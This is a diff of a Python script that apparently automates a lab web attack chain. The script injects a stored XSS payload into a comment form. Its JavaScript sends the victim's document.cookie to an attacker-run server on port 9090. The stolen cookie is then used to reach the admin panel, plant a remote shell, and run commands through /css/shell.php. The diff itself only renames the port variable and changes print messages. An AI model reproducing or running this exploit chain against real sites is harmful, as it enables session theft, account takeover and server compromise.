@@ -6,17 +6,19 @@ import threading
 import time
 import  requests
 
-#use: serverth2.py
+
 
 IP_victim="172.16.113.150"
 IP_Attack="172.16.113.148"
+Port=9090
+
 
 ''' 
 xss.js 
 
 function xss(){
         var  img = document.createElement('img');
-        img.src = 'http://IP_Attack:9090/?'+document.cookie;
+        img.src = 'http://IP_Attack:Port/?'+document.cookie;
         document.body.appendChild(img)
 }
 
@@ -28,10 +30,10 @@ xss();
 
 def xss_attack():
 	uri="http://"+IP_victim +"/post_comment.php?id=2"
-	vector="<script src=\""+"http://"+IP_Attack+":9090/xss.js\"></script>"
+	vector="<script src=\""+"http://"+IP_Attack+":"+str(Port)+"/xss.js\"></script>"
 	payload={'title':'Confuse', 'author':'nyanyi','text':vector,'submit':'submit'}
 	r=requests.post(uri, data=payload)
-	print("xss attack")
+	print("Sending xss..")
 	
 def get_admin(cookie_value):
 	uri_admin="http://"+IP_victim+"/admin/"
@@ -50,18 +52,11 @@ def remote_shell(cookie_value):
 
 def command_test():
 	uri="http://"+IP_victim+"/css/shell.php"
-	payload={'c':'uname;id'}
+	payload={'c':'uname;id;date'}
 	r=requests.get(uri, params=payload)
 	print(r.text)
 
 
-
-
-
-#Server port assignment
-port = 9090
-
-#inheritance of SimpleHTTPServer
 class Handler(SimpleHTTPRequestHandler):
 	def do_GET(self):
 		global control
@@ -90,6 +85,7 @@ class Handler(SimpleHTTPRequestHandler):
 		if(cookie):
 			# server down
 			thread2.start()
+			print("Server down")
 			get_admin(cookie)
 			remote_shell(cookie)
 			command_test()
@@ -99,8 +95,8 @@ class Handler(SimpleHTTPRequestHandler):
 
 #main
 
-server= TCPServer(("", port), Handler)
-print("Start server")
+server= TCPServer(("", Port), Handler)
+print("Server Up")
 thread=threading.Thread(target=server.serve_forever)
 thread.start()
 xss_attack()
